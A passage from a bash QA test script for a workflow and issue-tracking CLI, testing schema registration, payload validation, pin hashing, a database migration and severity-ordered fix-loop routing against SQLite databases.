      "schemas: $SC_COUNT_BEFORE -> $SC_COUNT_AFTER rows, max row_version $SC_ROWV_AFTER"
  fi

  # ---------------------------------------------------------------------------
  # ZG25: cross-validation at `workflow register` (§4.9), and payload validation
  # at `complete` (§4.8), driven end to end.
  # ---------------------------------------------------------------------------

  cat >"$ZG_SC/cross.toml" <<'TOML'
[pipeline]
name = "cross-validated"
version = 1
[match]
kind = ["task"]
[[step]]
name = "assess"
after = []
executor = "someone"
emits = "report"
payload = "findings@1"
threshold = { "fix-loop" = "any(severity >= high)" }

# The loop body V17b requires (DKT-196), incidental to ZG25's subject —
# cross-validation of `payload` against the schema register — but a `fix-loop`
# routing with nothing to enter is refused at registration, which would fail
# this case for a reason that has nothing to do with schemas.
[[step]]
name       = "remediate"
executor   = "someone"
emits      = "fix-summary"
loop       = true
after_loop = "assess"
TOML

  # It registers, because findings@1 is registered and declares an order for
  # `severity`. This is the sentence the whole stage exists to make true.
  run_env "$ZG_SC" workflow register "$ZG_SC/cross.toml" --json
  assert_exit "ZG" "ZG25_register_cross" 0

  # V25a: the same file against a repo with no such schema is refused.
  local ZG_V25A
  ZG_V25A=$(qa_mktemp_d)
  run_env "$ZG_V25A" init >/dev/null
  run_env "$ZG_V25A" workflow register "$ZG_SC/cross.toml" --json
  assert_exit "ZG" "ZG25_v25a_exit" 3
  assert_json "ZG" "ZG25_v25a_code" ".code" "VALIDATION_ERROR"
  assert_stdout_contains "ZG" "ZG25_v25a_remedy" "docket schema register findings@1"
  rm -rf "$ZG_V25A"

  # V21c: an ordered comparison on a field with no declared order.
  sed 's/any(severity >= high)/any(status >= unmet)/; s/^version = 1/version = 2/' \
    "$ZG_SC/cross.toml" >"$ZG_SC/v21c.toml"
  run_env "$ZG_SC" workflow register "$ZG_SC/v21c.toml" --json
  assert_exit "ZG" "ZG25_v21c_exit" 3
  assert_stdout_contains "ZG" "ZG25_v21c_names_rule" "ordered_enum"

  # The run: activate, and the schema JOINS THE PIN SET (§4.7 P1).
  run_env "$ZG_SC" issue create -t "ZG25 subject" -d "a body" --json
  local SC_ISSUE
  SC_ISSUE=$(echo "$CMD_STDOUT" | jq -r '.data.id')
  run_env "$ZG_SC" run start --issue "$SC_ISSUE" --json
  local SC_RUN
  SC_RUN=$(echo "$CMD_STDOUT" | jq -r '.data.run')
  run_env "$ZG_SC" run activate "$SC_RUN" --json
  assert_exit "ZG" "ZG25_activate" 0

  run_env "$ZG_SC" run status "$SC_RUN" --json
  assert_json "ZG" "ZG25_schema_pin" \
    '.data.pins | map(select(.kind == "schema")) | .[0].ref' "findings@1"
  local SC_PIN_SHA
  SC_PIN_SHA=$(echo "$CMD_STDOUT" | \
    jq -r '.data.pins | map(select(.kind == "schema")) | .[0].sha256')
  check_cond "ZG" "ZG25_pin_hash" "pin hash $SC_PIN_SHA, registry hash $SC_REGISTERED_SHA" [ "$SC_PIN_SHA" = "$SC_REGISTERED_SHA" ]

  # C2/C3: an invalid payload is refused, path-precisely, before anything is
  # written.
  local SC_STEP SC_TOKEN SC_ROWV_STEP
  SC_STEP=$(zg_step_id "$ZG_SC" "assess@0")
  run_env "$ZG_SC" step claim "$SC_STEP" --owner qa --json
  SC_TOKEN=$(printf '%s' "$CMD_STDOUT" | jq -r '.data.token')
  SC_ROWV_STEP=$(sqlite3 "$ZG_SC/issues.db" \
    "SELECT row_version FROM steps WHERE instance='assess@0';")

  printf 'a body\n' >"$ZG_SC/artifact.txt"
  printf '[{"severity":"low"},{"severity":"urgent"}]\n' >"$ZG_SC/bad-payload.json"
  DOCKET_TOKEN="$SC_TOKEN" run_env "$ZG_SC" step complete "$SC_STEP" \
    --artifact-file "$ZG_SC/artifact.txt" --payload-file "$ZG_SC/bad-payload.json" --json
  assert_exit "ZG" "ZG25_bad_payload_exit" 3
  assert_json "ZG" "ZG25_bad_payload_code" ".code" "VALIDATION_ERROR"
  assert_stdout_contains "ZG" "ZG25_bad_payload_path" 'payload[1].severity'

  # C4: an ABSENT payload on a step that declares one.
  DOCKET_TOKEN="$SC_TOKEN" run_env "$ZG_SC" step complete "$SC_STEP" \
    --artifact-file "$ZG_SC/artifact.txt" --json
  assert_exit "ZG" "ZG25_absent_payload_exit" 3
  assert_stdout_contains "ZG" "ZG25_absent_payload_names_schema" "findings@1"

  # C6: authorization precedes content. A non-holder gets AUTH_ERROR and learns
  # nothing about the schema.
  DOCKET_TOKEN="not-the-holders-token" run_env "$ZG_SC" step complete "$SC_STEP" \
    --artifact-file "$ZG_SC/artifact.txt" --payload-file "$ZG_SC/bad-payload.json" --json
  assert_exit "ZG" "ZG25_nonholder_exit" 5
  assert_json "ZG" "ZG25_nonholder_code" ".code" "AUTH_ERROR"
  if printf '%s' "$CMD_STDOUT" | grep -q 'severity\|findings'; then
    check "ZG" "ZG25_nonholder_leaks_nothing" "FAIL" \
      "the AUTH refusal disclosed the schema"
  else
    check "ZG" "ZG25_nonholder_leaks_nothing" "PASS"
  fi

  # Every refusal wrote nothing: the step's CAS column has not moved.
  local SC_ROWV_STEP_AFTER
  SC_ROWV_STEP_AFTER=$(sqlite3 "$ZG_SC/issues.db" \
    "SELECT row_version FROM steps WHERE instance='assess@0';")
  check_cond "ZG" "ZG25_refusals_left_version" "row_version $SC_ROWV_STEP -> $SC_ROWV_STEP_AFTER across three refusals" [ "$SC_ROWV_STEP_AFTER" = "$SC_ROWV_STEP" ]

  # And a VALID payload completes.
  printf '[{"severity":"low"},{"severity":"high"}]\n' >"$ZG_SC/good-payload.json"
  DOCKET_TOKEN="$SC_TOKEN" run_env "$ZG_SC" step complete "$SC_STEP" \
    --artifact-file "$ZG_SC/artifact.txt" --payload-file "$ZG_SC/good-payload.json" --json
  assert_exit "ZG" "ZG25_valid_payload" 0

  # ---------------------------------------------------------------------------
  # ZG26: GROUP-1 DORMANCY (§3), and the §9.5 golden sensitivity for schema pins.
  #
  # The claim: a repo that never registers a SCHEMA behaves byte-identically to
  # v8 on every pre-existing verb, and a schema-less workflow registers,
  # activates, and expands exactly as it did at S4.
  # ---------------------------------------------------------------------------

  local ZG_DORM9
  ZG_DORM9=$(qa_mktemp_d)
  run_env "$ZG_DORM9" init >/dev/null

  # The registry holds the one builtin and nothing else, and no pre-existing
  # verb reads it.
  local D9_ROWS
  D9_ROWS=$(sqlite3 "$ZG_DORM9/issues.db" "SELECT COUNT(*) FROM schemas;")
  check_cond "ZG" "ZG26_registry_holds_the_builtin" "$D9_ROWS schemas in a fresh repo, want the one builtin" [ "$D9_ROWS" = "1" ]

  run_env "$ZG_DORM9" issue create -t "ZG26 dormancy subject" --json
  run_env "$ZG_DORM9" issue move DKT-1 todo --json
  local D9_NEXT_BEFORE D9_LIST_BEFORE
  run_env "$ZG_DORM9" next --json; D9_NEXT_BEFORE="$CMD_STDOUT"
  run_env "$ZG_DORM9" issue list --all --json; D9_LIST_BEFORE="$CMD_STDOUT"

  run_env "$ZG_DORM9" schema register findings@1 "$SC_FILE" --json
  assert_exit "ZG" "ZG26_register_into_dormant" 0

  local D9_NEXT_AFTER D9_LIST_AFTER
  run_env "$ZG_DORM9" next --json; D9_NEXT_AFTER="$CMD_STDOUT"
  run_env "$ZG_DORM9" issue list --all --json; D9_LIST_AFTER="$CMD_STDOUT"
  if [ "$D9_NEXT_BEFORE" = "$D9_NEXT_AFTER" ] && [ "$D9_LIST_BEFORE" = "$D9_LIST_AFTER" ]; then
    check "ZG" "ZG26_registering_changes_nothing" "PASS"
  else
    check "ZG" "ZG26_registering_changes_nothing" "FAIL" \
      "a pre-existing verb's output changed after registering a schema"
  fi

  # THE TOPOLOGY IS UNTOUCHED BY SCHEMAS. The committed fixture's topology
  # golden is byte-identical to S4's, and it stays that way now that the fixture
  # declares a `payload`: a payload declaration decides what a step's
  # bytes must SATISFY, never which steps exist. A change here would mean
  # registering a schema had moved the graph, which nothing in §11.1 permits.
  local ZG_S4
  ZG_S4=$(qa_mktemp_d)
  run_env "$ZG_S4" init >/dev/null
  run_env "$ZG_S4" schema register findings@1 "$ZG_SCHEMA" --json >/dev/null
  run_env "$ZG_S4" workflow register "$FIXTURE" --json >/dev/null
  run_env "$ZG_S4" issue create -t "golden subject" -d "the golden request body" --json >/dev/null
  run_env "$ZG_S4" run start --issue DKT-1 --json >/dev/null
  run_env "$ZG_S4" run activate RUN-1 --json
  assert_exit "ZG" "ZG26_s4_activate" 0

  local D9_TOPO
  D9_TOPO=$(sqlite3 -noheader "$ZG_S4/issues.db" \
    "SELECT instance || '|' || kind || '|' || status || '|' ||
            COALESCE(executor,'') || '|' || COALESCE(class,'')
       FROM steps ORDER BY id;")
  check_cond "ZG" "ZG26_s4_topology_identical" "the fixture no longer expands to the S4 topology" [ "$D9_TOPO" = "$(cat "$ZG_GOLD/topology.golden")" ]

  # THE PINS GOLDEN (§4.7, §9.5 level 1). Two schemas: the BUILTIN, which
  # `reconcile` brings in by being `action = "aggregate"` (P5), and `findings@1`,
  # which that same step declares (V29).
  local D9_PINS
  D9_PINS=$(sqlite3 -noheader "$ZG_S4/issues.db" \
    "SELECT kind || '|' || ref || '|' || sha256 FROM pins ORDER BY kind, ref;")
  check_cond "ZG" "ZG26_pins_golden" "the pin set does not match the committed golden" [ "$D9_PINS" = "$(cat "$ZG_GOLD/pins.golden")" ]

  # GOLDEN SENSITIVITY (the ZF4b precedent, extended to schema pins per §4.7):
  # re-registering the schema at a NEW version and activating a workflow that
  # names it must CHANGE the pin set, or the pin is not being recorded and every
  # assertion above passes vacuously.
  #
  # The two halves run in SEPARATE repos rather than in one, because two versions
  # of a pipeline both matching one issue is itself a refusal (§11.1's
  # exactly-one-match rule) — the subject here is the pin, not the binding.
  zg_schema_pin_of() {
    local ZG_SENS_DIR="$1" ZG_SENS_SCHEMA="$2" ZG_SENS_WF="$3"
    run_env "$ZG_SENS_DIR" init >/dev/null
    run_env "$ZG_SENS_DIR" schema register "$ZG_SENS_SCHEMA" "$4" --json >/dev/null
    run_env "$ZG_SENS_DIR" workflow register "$ZG_SENS_WF" --json >/dev/null
    run_env "$ZG_SENS_DIR" issue create -t "sensitivity subject" -d "a body" --json >/dev/null
    run_env "$ZG_SENS_DIR" run start --issue DKT-1 --json >/dev/null
    run_env "$ZG_SENS_DIR" run activate RUN-1 --json >/dev/null
    sqlite3 -noheader "$ZG_SENS_DIR/issues.db" \
      "SELECT ref || '|' || sha256 FROM pins WHERE kind='schema';"
  }

  local ZG_SENS_A ZG_SENS_B SENS_PIN_A SENS_PIN_B
  ZG_SENS_A=$(qa_mktemp_d)
  ZG_SENS_B=$(qa_mktemp_d)

  # The second version differs by one enum value, so its hash differs too.
  sed 's/"info", //' "$SC_FILE" >"$ZG_SENS_B/findings-2.json"
  sed 's/^version = 1/version = 2/; s/findings@1/findings@2/' \
    "$ZG_SC/cross.toml" >"$ZG_SENS_B/cross-2.toml"

  SENS_PIN_A=$(zg_schema_pin_of "$ZG_SENS_A" "findings@1" "$ZG_SC/cross.toml" "$SC_FILE")
  SENS_PIN_B=$(zg_schema_pin_of "$ZG_SENS_B" "findings@2" "$ZG_SENS_B/cross-2.toml" \
    "$ZG_SENS_B/findings-2.json")

  if [ -n "$SENS_PIN_A" ] && [ -n "$SENS_PIN_B" ] && [ "$SENS_PIN_A" != "$SENS_PIN_B" ]; then
    check "ZG" "ZG26_pins_are_sensitive" "PASS"
  else
    check "ZG" "ZG26_pins_are_sensitive" "FAIL" \
      "the pin did not change with the schema version (A: $SENS_PIN_A  B: $SENS_PIN_B)"
  fi
  rm -rf "$ZG_SENS_A" "$ZG_SENS_B"

  # ---------------------------------------------------------------------------
  # ZG27: the 4 -> 9 fixture protocol (§4.4.1 U6).
  #
  # The v9 structures are asserted present BEFORE the golden diff is trusted:
  # a diff against a database that failed to migrate passes vacuously.
  # ---------------------------------------------------------------------------

  local ZG_FX9
  ZG_FX9=$(qa_mktemp_d)
  cp "$SCRIPT_DIR/qa/fixtures/v4-baseline.db" "$ZG_FX9/issues.db"

  local FX9_LIST_BEFORE FX9_SHOW_BEFORE
  run_env "$ZG_FX9" issue list --all --json; FX9_LIST_BEFORE="$CMD_STDOUT"
  run_env "$ZG_FX9" issue show DKT-1 --json; FX9_SHOW_BEFORE="$CMD_STDOUT"
  if [ -n "$FX9_LIST_BEFORE" ] && [ -n "$FX9_SHOW_BEFORE" ]; then
    check "ZG" "ZG27_nonempty" "PASS"
  else
    check "ZG" "ZG27_nonempty" "FAIL" "the fixture reads were empty"
  fi

  run_env "$ZG_FX9" config --json
  assert_json "ZG" "ZG27_migrated_to_current" ".data.schema_version" "$CURRENT_SCHEMA_VERSION"

  # The v9 TABLE.
  local FX9_TBL
  FX9_TBL=$(sqlite3 "$ZG_FX9/issues.db" \
    "SELECT COUNT(*) FROM sqlite_master WHERE type='table' AND name='schemas';")
  check_cond "ZG" "ZG27_schemas_table" "schemas missing after 4->9" [ "$FX9_TBL" = "1" ]
  local FX9_IDX
  FX9_IDX=$(sqlite3 "$ZG_FX9/issues.db" \
    "SELECT COUNT(*) FROM sqlite_master WHERE type='index' AND name='idx_schemas_name';")
  check_cond "ZG" "ZG27_schemas_index" "idx_schemas_name missing after 4->9" [ "$FX9_IDX" = "1" ]

  # The v9 COLUMN, which the sentinels cannot see.
  local FX9_COL
  FX9_COL=$(sqlite3 "$ZG_FX9/issues.db" \
    "SELECT COUNT(*) FROM pragma_table_info('artifacts') WHERE name='stub';")
  check_cond "ZG" "ZG27_artifacts_stub" "artifacts.stub missing after 4->9" [ "$FX9_COL" = "1" ]

  # The seed: exactly one builtin row in a repo that has never registered a
  # schema.
  local FX9_SEEDED
  FX9_SEEDED=$(sqlite3 "$ZG_FX9/issues.db" "SELECT COUNT(*) FROM schemas;")
  check_cond "ZG" "ZG27_seeded_builtin" "$FX9_SEEDED schemas in a migrated v4 repo, want the one builtin" [ "$FX9_SEEDED" = "1" ]

  # NOW the golden diff is worth trusting.
  local FX9_LIST_AFTER FX9_SHOW_AFTER
  run_env "$ZG_FX9" issue list --all --json; FX9_LIST_AFTER="$CMD_STDOUT"
  run_env "$ZG_FX9" issue show DKT-1 --json; FX9_SHOW_AFTER="$CMD_STDOUT"
  if [ "$FX9_LIST_BEFORE" = "$FX9_LIST_AFTER" ] && [ "$FX9_SHOW_BEFORE" = "$FX9_SHOW_AFTER" ]; then
    check "ZG" "ZG27_golden_identical" "PASS"
  else
    check "ZG" "ZG27_golden_identical" "FAIL" \
      "a v4 repo's output changed across the 4->9 migration"
  fi

  # The rewind guard, for v9's sentinel: stamped 9 with `schemas` gone must
  # re-migrate rather than trust the stamp. This is the group-1/group-2 trap,
  # and the operator's own tracker is exactly this shape between the groups.
  sqlite3 "$ZG_FX9/issues.db" "DROP TABLE IF EXISTS schemas;"
  local FX9_STAMP
  FX9_STAMP=$(sqlite3 "$ZG_FX9/issues.db" "SELECT value FROM meta WHERE key='schema_version';")
  check_cond "ZG" "ZG27_rewind_premise" "stamp=$FX9_STAMP before the guard runs" [ "$FX9_STAMP" = "$CURRENT_SCHEMA_VERSION" ]
  run_env "$ZG_FX9" issue list --all --json >/dev/null
  FX9_TBL=$(sqlite3 "$ZG_FX9/issues.db" \
    "SELECT COUNT(*) FROM sqlite_master WHERE type='table' AND name='schemas';")
  FX9_SEEDED=$(sqlite3 "$ZG_FX9/issues.db" "SELECT COUNT(*) FROM schemas;" 2>/dev/null || echo ERR)
  if [ "$FX9_TBL" = "1" ] && [ "$FX9_SEEDED" = "1" ]; then
    check "ZG" "ZG27_rewind_guard" "PASS"
  else
    check "ZG" "ZG27_rewind_guard" "FAIL" \
      "the rewind guard left schemas table=$FX9_TBL rows=$FX9_SEEDED"
  fi

  # ---------------------------------------------------------------------------
  # ZG28: THE LOOP DRIVEN BY AN ORDERED COMPARISON (§8.1's ten steps).
  #
  # ZG20 drives the loop from `verify`'s EQUALITY threshold, and that case stays
  # exactly as it was — it is the T1 path and the only proof that equality still
  # needs no schema. This is the SECOND driver, not a replacement:
  #
  #   reconcile  { "fix-loop" = "any(severity >= high)" }   an ORDERED
  #              comparison over a payload the real `aggregate` computed, with
  #              `severity`'s order coming from a schema THE OPERATOR REGISTERED
  #              and from nothing else.
  #
  # It is the sentence the whole stage exists to make true, driven end to end:
  # a registered file says `severity` goes info < low < medium < high < blocker,
  # a workflow says `any(severity >= high)`, and docket routes on it.
  #
  # Each twin gets its OWN repo. `zg_step_id` resolves an instance name across
  # the whole database, so three runs of one workflow in one repo would give it
  # three rows for `implement@0` — the same reason ZG26's sensitivity halves run
  # apart.
  # ---------------------------------------------------------------------------

  printf 'the change summary\n' >"$ZG_TMP/a-artifact.txt"

  # zg_ordered_repo builds a repo with the schema and the fixture registered,
  # and drives one issue to `reconcile@0` over the given clustered payload.
  zg_ordered_repo() {
    local ZG_O_DIR="$1" ZG_O_CLUSTERS="$2" ZG_O_I
    run_env "$ZG_O_DIR" init >/dev/null
    run_env "$ZG_O_DIR" schema register findings@1 "$ZG_SCHEMA" --json >/dev/null
    run_env "$ZG_O_DIR" workflow register "$FIXTURE" --json >/dev/null
    zg_trust_fixture_gates "$ZG_O_DIR"
    run_env "$ZG_O_DIR" issue create -t "ZG28 ordered" -d "the body" --json >/dev/null
    run_env "$ZG_O_DIR" run start --issue DKT-1 --json >/dev/null
    run_env "$ZG_O_DIR" run activate RUN-1 --json >/dev/null

    zg_complete_step "$ZG_O_DIR" "implement@0" "$ZG_TMP/a-artifact.txt" ""
    for ZG_O_I in 0 1 2 3; do
      zg_complete_step "$ZG_O_DIR" "review@0#$ZG_O_I" "$ZG_TMP/a-artifact.txt" ""
    done
    # The clustered payload is recorded on `synthesize` AND NOWHERE ELSE.
    #
    # `reconcile` declares `inputs = ["synthesize.findings"]`, and the builtin's
    # input is the payloads of the artifacts that declaration names (§2).
    # NOTHING BELOW CLAIMS OR COMPLETES `reconcile@0` — `claim` refuses
    # an action step (§6.15) and the ENGINE runs it, which is what makes this
    # section a proof of the production flow rather than of a flow only the QA
    # can produce. The `next` below is the invocation that drives it, exactly as
    # a dispatcher's poll does.
    zg_complete_step "$ZG_O_DIR" "synthesize@0" "$ZG_TMP/a-artifact.txt" "$ZG_O_CLUSTERS"
    run_env "$ZG_O_DIR" next --run RUN-1 --json >/dev/null
  }

  # (1)-(3) The registered schema, the pins, and the clustered synthesize.
  local ZG_A
  ZG_A=$(qa_mktemp_d)
  cat >"$ZG_TMP/clusters.json" <<'ZGCLUSTEOF'
[
  {"id":"C-1","severity":["low","blocker"]},
  {"id":"C-2","severity":["medium","high"]},
  {"id":"C-3","severity":"info"}
]
ZGCLUSTEOF

  run_env "$ZG_A" init >/dev/null
  run_env "$ZG_A" schema register findings@1 "$ZG_SCHEMA" --json
  assert_exit "ZG" "ZG28_schema_register" 0
  assert_json "ZG" "ZG28_ordered_field" \
    '.data.ordered_fields | join(",")' "severity"
  rm -rf "$ZG_A"
  ZG_A=$(qa_mktemp_d)
  zg_ordered_repo "$ZG_A" "$ZG_TMP/clusters.json"
  assert_exit "ZG" "ZG28_reconcile" 0

  local ZG_A_SHA ZG_A_PINS
  ZG_A_SHA=$(shasum -a 256 "$ZG_SCHEMA" | cut -d' ' -f1)
  ZG_A_PINS=$(sqlite3 -noheader "$ZG_A/issues.db" \
    "SELECT ref || '|' || sha256 FROM pins WHERE kind='schema' ORDER BY ref;")
  if printf '%s' "$ZG_A_PINS" | grep -q "findings@1|$ZG_A_SHA" &&
     printf '%s' "$ZG_A_PINS" | grep -q 'aggregate@1|'; then
    check "ZG" "ZG28_schema_pins" "PASS"
  else
    check "ZG" "ZG28_schema_pins" "FAIL" \
      "pins are '$ZG_A_PINS'; want findings@1 at $ZG_A_SHA and the builtin"
  fi

  # (4) The REAL aggregate's output, against a golden:
  #
  #   C-1 {low, blocker}   positions 1,4 -> median m[(2-1)/2] = m[0] -> `low`
  #                        spread 3 -> HELD; demoted_from `blocker`
  #   C-2 {medium, high}   positions 2,3 -> median -> `medium`
  #                        spread 1 -> not held; demoted_from `high`
  #   C-3 scalar `info`    the G2 identity: one member, spread 0, nothing held,
  #                        nothing demoted
  local ZG_A_OUT ZG_A_GOLD ZG_A_WANT
  ZG_A_OUT=$(sqlite3 "$ZG_A/issues.db" \
    "SELECT payload FROM artifacts a JOIN steps s ON s.id = a.step_id
      WHERE s.instance='reconcile@0' AND a.kind='findings'
      ORDER BY a.id DESC LIMIT 1;")
  ZG_A_GOLD=$(printf '%s' "$ZG_A_OUT" | jq -S -c \
    '[.[] | {id, severity, members, held, demoted_from, operator_resolved}]')
  ZG_A_WANT=$(printf '%s' '[
    {"id":"C-1","severity":"low","members":["low","blocker"],"held":true,
     "demoted_from":"blocker","operator_resolved":false},
    {"id":"C-2","severity":"medium","members":["medium","high"],"held":false,
     "demoted_from":"high","operator_resolved":false},
    {"id":"C-3","severity":"info","members":["info"],"held":false,
     "demoted_from":null,"operator_resolved":false}
  ]' | jq -S -c '.')
  check_cond "ZG" "ZG28_aggregate_golden" "aggregate output $ZG_A_GOLD, want $ZG_A_WANT" [ "$ZG_A_GOLD" = "$ZG_A_WANT" ]

  # `demoted_from` is absent as a KEY on the undemoted cluster, not present and
  # empty: an empty string would claim a demotion to nothing.
  local ZG_A_DEMKEY
  ZG_A_DEMKEY=$(printf '%s' "$ZG_A_OUT" | jq -c '[.[] | has("demoted_from")]')
  check_cond "ZG" "ZG28_demotion_key_absence" "has(demoted_from) = $ZG_A_DEMKEY, want [true,true,false]" [ "$ZG_A_DEMKEY" = "[true,true,false]" ]

  # (5) The materialized step exists, is `type=human`, is offered by
  # `next --run`, and NO DOWNSTREAM STEP IS READY (H8).
  local ZG_A_HELD
  ZG_A_HELD=$(sqlite3 "$ZG_A/issues.db" \
    "SELECT kind || '|' || status || '|' || materialized
       FROM steps WHERE instance='reconcile-held@0#0';")
  if [ "$ZG_A_HELD" = "human|pending|1" ]; then
    check "ZG" "ZG28_held_materialized" "PASS"
  else
    check "ZG" "ZG28_held_materialized" "FAIL" \
      "reconcile-held@0#0 is '$ZG_A_HELD', want human|pending|1"
  fi

  local ZG_A_READY
  ZG_A_READY=$(zg_ready_instances "$ZG_A")
  if printf '%s' "$ZG_A_READY" | grep -q 'reconcile-held@0#0'; then
    check "ZG" "ZG28_held_offered" "PASS"
  else
    check "ZG" "ZG28_held_offered" "FAIL" "ready set '$ZG_A_READY' omits the held step"
  fi
  if printf '%s' "$ZG_A_READY" | grep -qE 'verify@0|commit-gate@0|commit@0'; then
    check "ZG" "ZG28_downstream_blocked" "FAIL" \
      "a downstream step is ready while held: '$ZG_A_READY'"
  else
    check "ZG" "ZG28_downstream_blocked" "PASS"
  fi

  # The routing step is `gated` with NO routing recorded: the decision is
  # DEFERRED, not made and overwritten later.
  local ZG_A_GATED
  ZG_A_GATED=$(sqlite3 "$ZG_A/issues.db" \
    "SELECT status || '|' || COALESCE(routing,'') || '|' || COALESCE(saga_stage,'')
       FROM steps WHERE instance='reconcile@0';")
  if [ "$ZG_A_GATED" = "gated||held" ]; then
    check "ZG" "ZG28_routing_deferred" "PASS"
  else
    check "ZG" "ZG28_routing_deferred" "FAIL" \
      "reconcile@0 is '$ZG_A_GATED', want gated||held"
  fi

  # H11 (as revised): `guard stop` DENIES while a held cluster is open.
  run_env "$ZG_A" guard stop
  assert_exit "ZG" "ZG28_guard_stop_denies_while_held" 2

  # (6) Approve. The resolved artifact carries operator_resolved, the held one
  # stays addressable, and the saga advanced — the ordered comparison EVALUATED
  # rather than parking, which is the half T3 used to make impossible.
  local ZG_A_HELDID
  ZG_A_HELDID=$(zg_step_id "$ZG_A" 'reconcile-held@0#0')
  run_env "$ZG_A" step approve "$ZG_A_HELDID" --json
  assert_exit "ZG" "ZG28_approve" 0

  local ZG_A_RESOLVED
  ZG_A_RESOLVED=$(sqlite3 "$ZG_A/issues.db" \
    "SELECT payload FROM artifacts a JOIN steps s ON s.id = a.step_id
      WHERE s.instance='reconcile@0' ORDER BY a.id DESC LIMIT 1;")
  if [ "$(printf '%s' "$ZG_A_RESOLVED" | jq -c '[.[] | .operator_resolved]')" = \
       "[true,false,false]" ]; then
    check "ZG" "ZG28_operator_resolved" "PASS"
  else
    check "ZG" "ZG28_operator_resolved" "FAIL" \
      "operator_resolved = $(printf '%s' "$ZG_A_RESOLVED" | jq -c '[.[] | .operator_resolved]')"
  fi

  local ZG_A_NART
  ZG_A_NART=$(sqlite3 "$ZG_A/issues.db" \
    "SELECT COUNT(*) FROM artifacts a JOIN steps s ON s.id = a.step_id
      WHERE s.instance='reconcile@0' AND a.kind='findings';")
  check_cond "ZG" "ZG28_held_artifact_immutable" "$ZG_A_NART findings artifacts on reconcile@0; approval records a NEW one" [ "$ZG_A_NART" -ge 2 ]

  local ZG_A_ROUTE
  ZG_A_ROUTE=$(sqlite3 "$ZG_A/issues.db" \
    "SELECT routing || '|' || status || '|' || COALESCE(saga_stage,'')
       FROM steps WHERE instance='reconcile@0';")
  if [ "$ZG_A_ROUTE" = "pass|done|" ]; then
    check "ZG" "ZG28_ordered_comparison_evaluated" "PASS"
  else
    check "ZG" "ZG28_ordered_comparison_evaluated" "FAIL" \
      "reconcile@0 is '$ZG_A_ROUTE'; over medians low/medium/info the ordered " \
      "comparison must DECIDE (pass), never PARK — T3 is closed for a declared ordered_enum"
  fi

  # (7) Downstream is unblocked and the run finishes.
  ZG_A_READY=$(zg_ready_instances "$ZG_A")
  if printf '%s' "$ZG_A_READY" | grep -q 'verify@0'; then
    check "ZG" "ZG28_downstream_unblocked" "PASS"
  else
    check "ZG" "ZG28_downstream_unblocked" "FAIL" \
      "verify@0 is not ready after the hold resolved: '$ZG_A_READY'"
  fi

  # ---------------------------------------------------------------------------
  # (8) THE HEADLINE, and the negative twin in one repo: clusters whose MEDIANS
  # reach `high`, and none of whose spreads reaches `hold_spread = 2`.
  #
  # Nothing is held, no step is materialized, ONE threshold evaluation happens,
  # and `any(severity >= high)` routes `fix-loop` FOR REAL — over an order a
  # user registered, with no agent vocabulary anywhere.
  # ---------------------------------------------------------------------------
  local ZG_B
  ZG_B=$(qa_mktemp_d)
  cat >"$ZG_TMP/narrow.json" <<'ZGNARROWEOF'
[
  {"id":"N-1","severity":["high","blocker"]},
  {"id":"N-2","severity":"medium"}
]
ZGNARROWEOF
  zg_ordered_repo "$ZG_B" "$ZG_TMP/narrow.json"

  local ZG_B_HELD
  ZG_B_HELD=$(sqlite3 "$ZG_B/issues.db" "SELECT COUNT(*) FROM steps WHERE materialized = 1;")
  check_cond "ZG" "ZG28_negative_twin_no_hold" "$ZG_B_HELD materialized steps with every spread below hold_spread" [ "$ZG_B_HELD" = "0" ]

  local ZG_B_ROUTE
  ZG_B_ROUTE=$(sqlite3 "$ZG_B/issues.db" \
    "SELECT routing FROM steps WHERE instance='reconcile@0';")
  if [ "$ZG_B_ROUTE" = "fix-loop" ]; then
    check "ZG" "ZG28_ordered_routes_fix_loop" "PASS"
  else
    check "ZG" "ZG28_ordered_routes_fix_loop" "FAIL" \
      "reconcile@0 routed '$ZG_B_ROUTE', want fix-loop — any(severity >= high) " \
      "over medians high/medium, with high's position coming from a REGISTERED schema"
  fi

  local ZG_B_LOOP
  ZG_B_LOOP=$(sqlite3 "$ZG_B/issues.db" "SELECT loop_count FROM run_issues WHERE run_id=1;")
  check_cond "ZG" "ZG28_ordered_loop_entered" "loop_count = $ZG_B_LOOP after an ordered fix-loop routing" [ "$ZG_B_LOOP" = "1" ]

  # And `fix@1` was instantiated by that routing — the loop's §11.3 effect,
  # reached through an ORDERED comparison rather than through an equality.
  local ZG_B_FIX
  ZG_B_FIX=$(sqlite3 "$ZG_B/issues.db" "SELECT COUNT(*) FROM steps WHERE instance='fix@1';")
  check_cond "ZG" "ZG28_ordered_loop_instantiated" "$ZG_B_FIX fix@1 instances after an ordered fix-loop routing" [ "$ZG_B_FIX" = "1" ]

  # ---------------------------------------------------------------------------
  # (9) THE REJECTION TWIN: approve replaced by reject. The routing step takes
  # its `on_fail`, NO resolved artifact is written, and the held artifact is
  # still addressable.
  # ---------------------------------------------------------------------------
  local ZG_C
  ZG_C=$(qa_mktemp_d)
  zg_ordered_repo "$ZG_C" "$ZG_TMP/clusters.json"

  local ZG_C_BEFORE ZG_C_HELDID
  ZG_C_BEFORE=$(sqlite3 "$ZG_C/issues.db" \
    "SELECT COUNT(*) FROM artifacts a JOIN steps s ON s.id = a.step_id
      WHERE s.instance='reconcile@0';")
  ZG_C_HELDID=$(zg_step_id "$ZG_C" 'reconcile-held@0#0')
  run_env "$ZG_C" step reject "$ZG_C_HELDID" --note "not acceptable" --json
  assert_exit "ZG" "ZG28_reject" 0

  local ZG_C_AFTER
  ZG_C_AFTER=$(sqlite3 "$ZG_C/issues.db" \
    "SELECT COUNT(*) FROM artifacts a JOIN steps s ON s.id = a.step_id
      WHERE s.instance='reconcile@0';")
  check_cond "ZG" "ZG28_reject_writes_no_artifact" "reject wrote $((ZG_C_AFTER - ZG_C_BEFORE)) artifacts; it records none" [ "$ZG_C_AFTER" = "$ZG_C_BEFORE" ]

  local ZG_C_ROUTE
  ZG_C_ROUTE=$(sqlite3 "$ZG_C/issues.db" \
    "SELECT routing || '|' || status FROM steps WHERE instance='reconcile@0';")
  case "$ZG_C_ROUTE" in
    waiting-human*"|waiting-human")
      check "ZG" "ZG28_reject_takes_on_fail" "PASS" ;;
    *)
      check "ZG" "ZG28_reject_takes_on_fail" "FAIL" \
        "reconcile@0 is '$ZG_C_ROUTE', want the effective on_fail waiting-human" ;;
  esac

  local ZG_C_HELDART
  ZG_C_HELDART=$(sqlite3 "$ZG_C/issues.db" \
    "SELECT COUNT(*) FROM artifacts a JOIN steps s ON s.id = a.step_id
      WHERE s.instance='reconcile@0' AND a.payload LIKE '%\"held\":true%';")
